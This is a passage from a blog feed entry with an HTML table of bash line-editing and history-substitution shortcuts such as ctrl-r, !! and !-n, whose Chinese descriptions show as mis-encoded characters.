&lt;td style="text-align:center">å‘å‰/åç§»åŠ¨ä¸€ä¸ªå­—ç¬¦&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">alt+d/ctrl+d&lt;/td>
&lt;td style="text-align:center">åˆ é™¤å…‰æ ‡åçš„ä¸€ä¸ªå•è¯/å­—ç¬¦&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl-n/ctrl-p&lt;/td>
&lt;td style="text-align:center">ä¸Šä¸€ä¸ª/ä¸‹ä¸€ä¸ªå‘½ä»¤&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl-/&lt;/td>
&lt;td style="text-align:center">undo&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">ctrl-r&lt;/td>
&lt;td style="text-align:center">reverse-i-search&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">!&lt;/td>
&lt;td style="text-align:center">history substitution&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">!n&lt;/td>
&lt;td style="text-align:center">Refer to command line n.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">!-n&lt;/td>
&lt;td style="text-align:center">Refer to the current command line minus n.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">!!&lt;/td>
&lt;td style="text-align:center">Refer to the previous command. This is a synonym for `!-1'.&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/></entry></feed>